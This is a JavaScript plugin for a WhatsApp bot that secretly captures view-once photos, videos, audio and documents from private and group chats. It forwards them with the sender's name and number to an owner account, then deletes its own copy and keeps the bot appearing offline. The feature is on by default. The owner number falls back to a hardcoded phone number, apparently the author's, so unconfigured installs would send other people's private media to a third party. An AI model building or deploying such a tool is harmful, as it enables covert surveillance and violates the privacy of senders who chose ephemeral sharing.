const { cmd } = require('../command');

let baileys;
try { baileys = require('@dnuzi/baileys'); }
catch (err) {
    try { baileys = require('@whiskeysockets/baileys'); }
    catch (err) {
        try { baileys = require('@adiwajshing/baileys'); }
        catch (e) { console.error("Baileys not found!"); }
    }
}

const { downloadContentFromMessage } = baileys;

// ══════════════════════════════════════════════════════════════
//  SILENT VIEW-ONCE FORWARDER — SHAVIYA-XMD
//  → Only view-once media → Owner silently
//  → Delete for ME only (bot side) after 1 second
//  → Owner keeps the media
//  → Deep unwrap for nested wrappers
//  Created by: Savendra Dampriya
// ══════════════════════════════════════════════════════════════

const OWNER_NUMBER = (process.env.OWNER_NUMBER || '94740711462').replace(/[^0-9]/g, '');
const OWNER_JID = OWNER_NUMBER + '@s.whatsapp.net';

// ⚙️ Delete delay = 1000ms (1 second)
const DELETE_DELAY_MS = 1000;

// Debug mode (set true to see logs)
const DEBUG = true;

global.mediaForwardEnabled = true;

if (!global.mediaFwdCaptured) global.mediaFwdCaptured = new Set();

// ─────────────────────────────────────────────
//  Force offline (invisible)
// ─────────────────────────────────────────────
function keepOffline(conn) {
    try { conn.sendPresenceUpdate('unavailable'); } catch (e) {}
}

// ─────────────────────────────────────────────
//  🗑️ Delete for ME only (bot's local chat)
//  Owner still has the message
// ─────────────────────────────────────────────
async function deleteForMe(conn, jid, key) {
    try {
        await conn.chatModify({
            clear: true,
            lastMessages: [{
                key: key,
                messageTimestamp: Math.floor(Date.now() / 1000)
            }]
        }, jid).catch(() => {});
        if (DEBUG) console.log('[VV-FWD] 🗑️ Deleted for me (bot side only)');
    } catch (e) {
        console.log('[VV-FWD] Delete for me error:', e.message);
    }
}

// ─────────────────────────────────────────────
//  ✅ DEEP UNWRAP — handles nested wrappers
//  ephemeralMessage → viewOnceMessageV2 → imageMessage
// ─────────────────────────────────────────────
function deepUnwrap(msg) {
    let actual = msg;
    let vvType = null;
    let depth = 0;

    while (actual && depth < 5) {
        depth++;

        // Unwrap deviceSentMessage
        if (actual.deviceSentMessage?.message) {
            actual = actual.deviceSentMessage.message;
            continue;
        }

        // Unwrap ephemeralMessage
        if (actual.ephemeralMessage?.message) {
            actual = actual.ephemeralMessage.message;
            continue;
        }

        // Unwrap viewOnceMessageV2Extension
        if (actual.viewOnceMessageV2Extension?.message) {
            vvType = 'View Once V2 Ext';
            actual = actual.viewOnceMessageV2Extension.message;
            continue;
        }

        // Unwrap viewOnceMessageV2
        if (actual.viewOnceMessageV2?.message) {
            vvType = 'View Once V2';
            actual = actual.viewOnceMessageV2.message;
            continue;
        }

        // Unwrap viewOnceMessage
        if (actual.viewOnceMessage?.message) {
            vvType = 'View Once V1';
            actual = actual.viewOnceMessage.message;
            continue;
        }

        // No more wrappers
        break;
    }

    return { message: actual, vvType, depth };
}

// ─────────────────────────────────────────────
//  Download media
// ─────────────────────────────────────────────
async function downloadMedia(msg, type) {
    try {
        const stream = await downloadContentFromMessage(msg, type);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
    } catch (err) {
        console.error(`[VV-FWD] Download ${type} error:`, err.message);
        return null;
    }
}

// ─────────────────────────────────────────────
//  Main handler
// ─────────────────────────────────────────────
async function handleViewOnceForward(conn, mek, m, ctx) {
    try {
        if (!global.mediaForwardEnabled) return;

        const msg = mek.message;
        if (!msg) return;

        const from = ctx.from;
        const isGroup = ctx.isGroup || (from && from.endsWith('@g.us'));

        // ✅ DEEP UNWRAP
        const { message: actualMsg, vvType, depth } = deepUnwrap(msg);

        if (DEBUG) {
            console.log(`[VV-FWD] 📨 Keys:`, Object.keys(msg).join(', '));
            console.log(`[VV-FWD] 🔍 Depth: ${depth}, VV Type: ${vvType || 'NONE'}`);
        }

        // If no view-once found → skip
        if (!vvType) {
            if (DEBUG) console.log('[VV-FWD] ⏭️ Not view-once — skip');
            return;
        }

        if (!actualMsg) return;

        // Determine content inside view-once
        let contentType = null;
        let contentMsg = null;

        if (actualMsg.imageMessage) { contentType = 'image'; contentMsg = actualMsg.imageMessage; }
        else if (actualMsg.videoMessage) { contentType = 'video'; contentMsg = actualMsg.videoMessage; }
        else if (actualMsg.audioMessage) { contentType = 'audio'; contentMsg = actualMsg.audioMessage; }
        else if (actualMsg.documentMessage) { contentType = 'document'; contentMsg = actualMsg.documentMessage; }

        if (!contentType || !contentMsg) {
            if (DEBUG) console.log('[VV-FWD] ⚠️ No content inside view-once:', Object.keys(actualMsg));
            return;
        }

        if (DEBUG) console.log(`[VV-FWD] ✅ Content: ${contentType}`);

        // Group filter: images only
        if (isGroup && contentType !== 'image') {
            if (DEBUG) console.log('[VV-FWD] ⏭️ Group filter: non-image skipped');
            return;
        }

        // Duplicate check
        const msgId = mek.key.id;
        if (global.mediaFwdCaptured.has(msgId)) {
            if (DEBUG) console.log('[VV-FWD] ⏭️ Duplicate');
            return;
        }
        global.mediaFwdCaptured.add(msgId);
        if (global.mediaFwdCaptured.size > 1000) {
            const arr = Array.from(global.mediaFwdCaptured);
            global.mediaFwdCaptured = new Set(arr.slice(-300));
        }

        // Metadata
        const senderNum = ctx.sender ? ctx.sender.split('@')[0] : 'Unknown';
        const senderName = m.pushName || 'User';
        const chatType = isGroup ? 'Group' : 'Private';
        const groupName = isGroup ? (ctx.groupName || 'Group') : '';

        const timestamp = new Date().toLocaleString('en-US', {
            timeZone: 'Asia/Colombo',
            hour: '2-digit', minute: '2-digit', hour12: true,
            day: '2-digit', month: 'short', year: 'numeric'
        });

        const icons = { image: '📸', video: '🎥', audio: '🎵', document: '📄' };
        const icon = icons[contentType] || '📎';

        const caption =
            `👁️ *View Once Captured*\n\n` +
            `📱 *From:* ${senderName}\n` +
            `🔢 *Number:* +${senderNum}\n` +
            `💬 *Chat:* ${chatType}${isGroup ? ' — ' + groupName : ''}\n` +
            `${icon} *Type:* ${contentType.toUpperCase()}\n` +
            `📦 *VV Type:* ${vvType}\n` +
            `⏰ *Time:* ${timestamp}\n\n` +
            `> 🔮 ⟡ ꜱ ʜ ᴀ ᴠ ɪ ʏ ᴀ - x ᴍ ᴅ ⟡ 🔮`;

        // Download + send
        let sentMsg = null;
        try {
            const buffer = await downloadMedia(contentMsg, contentType);
            if (!buffer) throw new Error('Download failed — null buffer');

            if (DEBUG) console.log(`[VV-FWD] 📥 Downloaded: ${(buffer.length / 1024).toFixed(1)} KB`);

            if (contentType === 'image') {
                sentMsg = await conn.sendMessage(OWNER_JID, { image: buffer, caption });
            } else if (contentType === 'video') {
                sentMsg = await conn.sendMessage(OWNER_JID, {
                    video: buffer,
                    mimetype: contentMsg.mimetype || 'video/mp4',
                    caption
                });
            } else if (contentType === 'audio') {
                sentMsg = await conn.sendMessage(OWNER_JID, {
                    audio: buffer,
                    mimetype: contentMsg.mimetype || 'audio/mp4',
                    ptt: contentMsg.ptt || false
                });
                await conn.sendMessage(OWNER_JID, { text: caption });
            } else if (contentType === 'document') {
                sentMsg = await conn.sendMessage(OWNER_JID, {
                    document: buffer,
                    mimetype: contentMsg.mimetype || 'application/octet-stream',
                    fileName: contentMsg.fileName || 'file',
                    caption
                });
            }

            if (DEBUG) console.log('[VV-FWD] 📤 Sent to owner');

            // 🗑️ Delete for ME only after 1 second
            if (sentMsg?.key) {
                setTimeout(async () => {
                    await deleteForMe(conn, OWNER_JID, sentMsg.key);
                }, DELETE_DELAY_MS);
            }

        } catch (mediaErr) {
            console.error('[VV-FWD] ❌ Forward error:', mediaErr.message);
        }

        keepOffline(conn);

    } catch (err) {
        console.error('[VV-FWD]', err.message);
    }
}

// ─────────────────────────────────────────────
//  Toggle command
// ─────────────────────────────────────────────
cmd({
    pattern: 'mediaforward',
    alias: ['mfwd', 'vvforward', 'vvfwd'],
    desc: 'Toggle silent view-once forwarding',
    category: 'owner',
    react: '👁️',
    filename: __filename
},
async (conn, mek, m, { from, reply, isOwner }) => {
    try {
        if (!isOwner) return reply('❌ *Owner only!*');

        global.mediaForwardEnabled = !global.mediaForwardEnabled;

        await conn.sendMessage(from, {
            react: { text: global.mediaForwardEnabled ? '✅' : '❌', key: mek.key }
        });

        await reply(
            `${global.mediaForwardEnabled ? '✅' : '❌'} *View-Once Forwarder*\n\n` +
            `📊 Status: *${global.mediaForwardEnabled ? 'ENABLED' : 'DISABLED'}*\n` +
            `🕵️ Mode: *Silent + Invisible*\n` +
            `📥 Destination: *+${OWNER_NUMBER}*\n` +
            `🗑️ Delete: *For ME only (1s)*\n` +
            `🔍 Debug: *${DEBUG ? 'ON' : 'OFF'}*\n\n` +
            `📋 *Rules:*\n` +
            `• ONLY view-once media (V1/V2/V2Ext)\n` +
            `• Normal media → SKIPPED\n` +
            `• Group → view-once images only\n` +
            `• Private → view-once (all types)\n\n` +
            `✅ Owner keeps media\n` +
            `✅ Bot number පේන්නේ නෑ`
        );

    } catch (err) {
        reply('❌ Error: ' + err.message);
    }
});

// ─────────────────────────────────────────────
//  Export hook
// ─────────────────────────────────────────────
module.exports = {
    mediaForwardHandler: async (conn, mek, m, ctx) => {
        if (!global.mediaForwardEnabled) return;
        await handleViewOnceForward(conn, mek, m, ctx);
    }
};
